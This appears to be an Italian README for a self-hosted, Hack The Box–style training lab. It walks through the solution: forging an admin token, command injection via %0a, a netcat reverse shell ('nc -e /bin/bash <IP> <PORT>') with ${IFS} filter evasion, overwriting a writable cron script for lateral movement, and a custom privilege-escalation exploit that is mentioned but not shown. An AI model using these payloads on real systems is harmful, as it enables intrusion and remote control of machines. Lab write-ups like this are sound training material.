# Lenguage: `IT`
# Guida instroduttiva al lab 1 ) SSRF + BUFFEROVERFLOW con movimento laterale lab completo stile htb. (Hack The Box)
+ Per rilovere questo lab devi passare per diverse aree ben definite,di seguito troverai la guida alla  soluzione.
+ Divideremo lattacco in tre fasi.
+ Fase 1) estrazione del Token admin direttamente nel webserver all'indirizzo del lab es; 172.X.X.X
+ togliendo un carattere nel mezzo del token dal server web, notiamo nessun controllo restrittivo,generiamo cosi il token admin.
```bash
        python3 generate_token.py
```
+ possiamo cosi incollare il token generato nel server web e passiamo ad admin user,notiamo che spunta un novo pannello.
+ test ed command injection.
# foothold and access granted...d(^_*)b...
+ Dopo vari test spunta fuori un www-data dal repeter del nostro burp  con la codifica %0a.
+ Bene testiamo `whoami`.
```bash
        127.0.0.1%0awhoami
```
+ il web server ci risponde con un 200 OK e andando in fondo alla risposta del repeter di burp vediamo un `www-data`, bene.
# Fase 1) L' intrusione.
+ dopo la risposta del web server al www-data introduciamo un vuovo payload nel secondo pannello apparso.
```bash
        # terminale in asclto lato attaccante nc -lvnp PORT
        %0anc${IFS}-e${IFS}/bin/bash${IFS}<IP>${IFS}<PORT>
        
        www-data:$  whoami
            www-data
```
# Fase 2) Il Movimento laterale.
+ esaminando il sistem ed enumerando tutti i servizi attibi notiamo uno strano binario.
```bash
        find / -writable -type d 2>/dev/null
            /home/user/secret
        ls -la /home/user/secret/
            /home/user/secret/.secret.sh
```
+ Dal controllo di ls -l /home/user/secret/.secret.sh, notiamo che possiamo scrivere il binario trovato, e che gira come utente user, un cronjob provabilmente.
+ Scriviamo una rev su binario trovato e siamo dentro come user.

# Fase 3) Privilege Escalation elevazione massima dei privilegi.
+ enumerando il systema viene fuori un certa porta interna strana dove gira un binario strano.

```bash
        ss -ltun 
        ps -aux
```
+ Bene proviamo a connetterci con netcat.
+ il server ci dice Inserisci il payload:, bene creamo l'exploit su misura con python,che troverete nella sezione exploit di questa cartella
+ Dopo vari test ed analisi si arriva alla conclusione di creare leploit su misura e siamo dentro come `root`

# Installazione ed instruzioni per l'uso con docker-compose...
```bash
        mv entrypoint entrypoint.sh
        chmod +x entrypoint.sh
        sudo docker-compose up --build -d
        sudo docker-compose down # per disattivare il container
```


